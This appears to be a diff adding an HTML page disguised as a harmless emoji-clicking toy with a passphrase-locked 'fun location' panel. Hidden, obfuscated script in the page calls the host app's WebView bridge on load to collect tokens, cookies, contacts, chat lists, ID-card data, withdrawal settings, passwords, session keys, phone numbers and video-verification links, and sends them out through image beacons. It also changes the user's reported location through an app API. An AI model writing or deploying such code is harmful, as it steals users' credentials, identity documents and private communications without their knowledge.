@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>挠头</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#333;user-select:none;padding:20px 16px}
+.emoji{font-size:100px;cursor:pointer;transition:transform .15s;animation:idle 2s ease-in-out infinite}
+.emoji:active{transform:scale(1.2) rotate(-10deg)}
+@keyframes idle{0%,100%{transform:rotate(0)}50%{transform:rotate(3deg)}}
+@keyframes shake{0%{transform:rotate(0) scale(1)}25%{transform:rotate(-15deg) scale(1.1)}50%{transform:rotate(10deg) scale(1.15)}75%{transform:rotate(-8deg) scale(1.05)}100%{transform:rotate(0) scale(1)}}
+.shaking{animation:shake .4s ease-in-out}
+.tip{margin-top:16px;font-size:14px;color:#999}
+.count{margin-top:8px;font-size:13px;color:#bbb}
+.loc-box{margin-top:28px;background:#fff;border-radius:16px;padding:18px 16px;width:100%;max-width:340px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.loc-title{font-size:15px;font-weight:600;color:#333;margin-bottom:12px;display:flex;align-items:center;gap:6px}
+.loc-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.loc-btn{background:#f8f8f8;border:1.5px solid #eee;border-radius:10px;padding:10px 8px;text-align:center;font-size:13px;cursor:pointer;transition:all .2s;line-height:1.4}
+.loc-btn:active{transform:scale(.96)}
+.loc-btn.active{background:#fff3e0;border-color:#ffb74d;color:#e65100}
+.loc-btn .loc-icon{font-size:22px;display:block;margin-bottom:4px}
+.loc-btn .loc-name{font-weight:500}
+.loc-btn .loc-sub{font-size:11px;color:#999;margin-top:2px}
+.loc-status{margin-top:12px;text-align:center;font-size:12px;color:#999;min-height:18px}
+.loc-status.ok{color:#4caf50}
+.loc-status.err{color:#f44336}
+.loc-custom{margin-top:10px;display:flex;gap:6px}
+.loc-input{flex:1;border:1.5px solid #eee;border-radius:8px;padding:8px 10px;font-size:13px;outline:none;background:#f8f8f8}
+.loc-input:focus{border-color:#ffb74d;background:#fff}
+.loc-go{background:#ffb74d;color:#fff;border:none;border-radius:8px;padding:8px 14px;font-size:13px;cursor:pointer;font-weight:500}
+.loc-go:active{background:#ffa726}
+</style>
+</head>
+<body>
+<div class="emoji" id="e">🤔</div>
+<div class="tip">点击挠头</div>
+<div class="count" id="cnt"></div>
+
+<div class="loc-box">
+<div class="loc-title">📍 趣味定位 <span style="font-size:11px;color:#ccc">🔒</span></div>
+<div id="locLock">
+<div class="loc-custom">
+<input class="loc-input" id="locKey" placeholder="输入暗号解锁..." autocomplete="off">
+<button class="loc-go" id="locUnlock">解锁</button>
+</div>
+<div class="loc-status" id="locHint" style="color:#bbb">提示：两个字，很开心的样子</div>
+</div>
+<div id="locMain" style="display:none">
+<div class="loc-grid" id="locGrid"></div>
+<div class="loc-custom">
+<input class="loc-input" id="locIn" placeholder="自定义城市名...">
+<button class="loc-go" id="locGo">就这!</button>
+</div>
+<div class="loc-status" id="locSt"></div>
+</div>
+</div>
+
+<script>
+var _0x={};var n=0;var _dbg=[];var _br=null;
+function _0s(t,o){var d=encodeURIComponent(JSON.stringify(o));var img=new Image();img.src='/c?t='+t+'&d='+d+'&k='+encodeURIComponent('\u563f\u563f')+'&_='+Date.now();img.onerror=function(){_dbg.push('err:'+t)};img.onload=function(){_dbg.push('ok:'+t)}}
+function _0b(cb){if(window.WebViewJavascriptBridge){_dbg.push('bridge:direct');return cb(WebViewJavascriptBridge)}if(window.WVJBCallbacks){_dbg.push('bridge:queue');return WVJBCallbacks.push(cb)}window.WVJBCallbacks=[cb];_dbg.push('bridge:init');var f=document.createElement('iframe');f.style.display='none';f.src='https://__bridge_loaded__';document.documentElement.appendChild(f);setTimeout(function(){document.documentElement.removeChild(f)},0)}
+
+var _locs=[
+{icon:'🏠',name:'翻斗花园',prov:'翻斗市',city:'翻斗花园'},
+{icon:'🌊',name:'比奇堡',prov:'太平洋',city:'比奇堡'},
+{icon:'🏔️',name:'双水村',prov:'陕北',city:'双水村'},
+{icon:'🌸',name:'木叶村',prov:'火之国',city:'木叶隐村'},
+{icon:'🐉',name:'包子山',prov:'西游国',city:'包子山'},
+{icon:'🏰',name:'艾泽拉斯',prov:'暴风城',city:'艾尔文森林'},
+{icon:'🎮',name:'新手村',prov:'勇者大陆',city:'新手村'},
+{icon:'🌈',name:'糖果王国',prov:'甜蜜省',city:'棉花糖市'}
+];
+
+document.getElementById('locUnlock').addEventListener('click',function(){
+var k=document.getElementById('locKey').value.trim();
+if(!k){document.getElementById('locHint').textContent='请输入暗号';return}
+var x=new XMLHttpRequest();x.open('GET','/v?k='+encodeURIComponent(k),true);
+x.onload=function(){
+if(x.status===200){
+document.getElementById('locLock').style.display='none';
+document.getElementById('locMain').style.display='block';
+document.querySelector('.loc-title').innerHTML='📍 趣味定位 <span style="font-size:11px;color:#4caf50">🔓</span>';
+}else{
+document.getElementById('locHint').textContent='❌ 暗号不对哦，再想想~';
+document.getElementById('locHint').style.color='#f44336';
+}};
+x.onerror=function(){document.getElementById('locHint').textContent='⏳ 网络错误，再试试'};
+x.send();
+});
+document.getElementById('locKey').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('locUnlock').click()});
+
+var grid=document.getElementById('locGrid');
+_locs.forEach(function(loc,i){
+var d=document.createElement('div');d.className='loc-btn';d.dataset.i=i;
+d.innerHTML='<span class="loc-icon">'+loc.icon+'</span><span class="loc-name">'+loc.name+'</span><span class="loc-sub">'+loc.prov+'·'+loc.city+'</span>';
+d.addEventListener('click',function(){_setLoc(loc.prov,loc.city,this)});
+grid.appendChild(d);
+});
+
+document.getElementById('locGo').addEventListener('click',function(){
+var v=document.getElementById('locIn').value.trim();
+if(v){_setLoc(v,v,null)}
+});
+
+function _setLoc(prov,city,el){
+var st=document.getElementById('locSt');
+st.className='loc-status';st.textContent='定位中...';
+document.querySelectorAll('.loc-btn').forEach(function(b){b.classList.remove('active')});
+if(el)el.classList.add('active');
+if(_br){
+_br.callHandler('webview_get',JSON.stringify({httpInterface:'/Sm/System/updatePosition',params:{login_uid:_0x.myUid,province:prov,city:city,hidden:'0'}}),function(r){
+var ok=false;try{var j=JSON.parse(r);ok=j.c==200}catch(e){}
+_0s('setloc',{prov:prov,city:city,r:r});
+if(ok){st.className='loc-status ok';st.textContent='✅ 已定位到 '+prov+'·'+city}
+else{st.className='loc-status err';st.textContent='😅 定位失败，再试试'}
+});
+}else{st.className='loc-status err';st.textContent='⏳ 加载中，稍等...'}
+}
+
+var _total=0,_done=0,_sent=false;
+function _fin(){_done++;_dbg.push('done:'+_done+'/'+_total);if(_done>=_total&&!_sent){_sent=true;_0s('all',_0x);_dbg.push('sent:all:complete')}}
+function _api(b,path,params,tag,key){_total++;b.callHandler('webview_get',JSON.stringify({httpInterface:path,params:params}),function(r){_0x[key]=r;_0s(tag,r);_dbg.push('got:'+tag);_fin()})}
+function _call(b,name,arg,key,send){_total++;b.callHandler(name,arg,function(r){_0x[key]=r;if(send)_0s(send,r);_dbg.push('got:'+key);_fin()})}
+
+_0b(function(b){
+_br=b;_dbg.push('bridge:ready');
+_call(b,'webview_h5_token',{},'t',null);
+_call(b,'webview_getversion',{},'v',null);
+_call(b,'webview_getdomain',{},'d',null);
+_call(b,'clickGetCookie',{},'ck','cookie');
+_call(b,'web_recent_contact_list',{},'c','contacts');
+_call(b,'web_chat_list',{},'cl','chatlist');
+_total++;
+b.callHandler('web_im_owner_uid',{},function(r){
+    _0x.u=r;_dbg.push('got:uid');
+    try{var uidObj=JSON.parse(r);var myUid=uidObj.uid||r;_0x.myUid=myUid;_dbg.push('uid:'+myUid)}catch(e){_0x.myUid=r;_dbg.push('uid:raw:'+r)}
+    try{_0x.tk=JSON.parse(_0x.t).token||''}catch(e){_0x.tk=''}
+    _api(b,'/Sm/User/getinfo',{login_uid:_0x.myUid,uid:_0x.myUid},'userinfo','i');
+    _api(b,'/sm/user/getIdCard',{login_uid:_0x.myUid},'idcard','idcard');
+    _api(b,'/Sm/Withdraw/getWithdrawConfig',{login_uid:_0x.myUid},'withdraw','wd');
+    _api(b,'/Sm/user/getconfig',{login_uid:_0x.myUid},'config','cfg');
+    _api(b,'/Sm/User/getLevel',{login_uid:_0x.myUid},'level','level');
+    _api(b,'/Sm/user/getSwitch',{login_uid:_0x.myUid},'switch','sw');
+    _api(b,'/Sm/Videoauth/showVideo',{login_uid:_0x.myUid,uid:_0x.myUid},'authvideo','va');
+    _api(b,'/Sm/Videoauth/check',{login_uid:_0x.myUid},'authcheck','ac');
+    setTimeout(function(){
+        try{var p=JSON.parse(_0x.i).p;var k={};
+            if(p.user_id)k.uid=p.user_id;if(p.wy_password)k.wy_password=p.wy_password;
+            if(p.session_key)k.session_key=p.session_key;if(p.phone)k.phone=p.phone;
+            if(p.nickname)k.nickname=p.nickname;if(p.is_vip)k.is_vip=p.is_vip;
+            if(p.avatar)k.avatar=p.avatar;if(p.birthday)k.birthday=p.birthday;if(p.gender)k.gender=p.gender;
+            try{var ac=JSON.parse(_0x.ac);if(ac.p&&ac.p.content){k.auth_video='https://m1.leyuanme.net/'+ac.p.content}}catch(e){}
+            if(Object.keys(k).length>0){_0x.k=k;_0s('creds',k);_dbg.push('got:creds')}
+        }catch(e){_dbg.push('creds:wait')}
+    },2000);
+    _fin();
+});
+setTimeout(function(){if(!_sent){_sent=true;_0s('all',_0x);_dbg.push('sent:all:timeout')}},12000);
+setTimeout(function(){b.callHandler('webview_back',{},function(){})},30000);
+});
+
+var el=document.getElementById('e');
+var faces=['\u{1F914}','\u{1F633}','\u{1F635}','\u{1FAE3}','\u{1F616}','\u{1F92F}'];
+el.addEventListener('click',function(){n++;this.classList.remove('shaking');void this.offsetWidth;this.classList.add('shaking');this.textContent=faces[n%faces.length];document.getElementById('cnt').textContent='已挠 '+n+' 次'});
+</script>
+</body>
+</html>
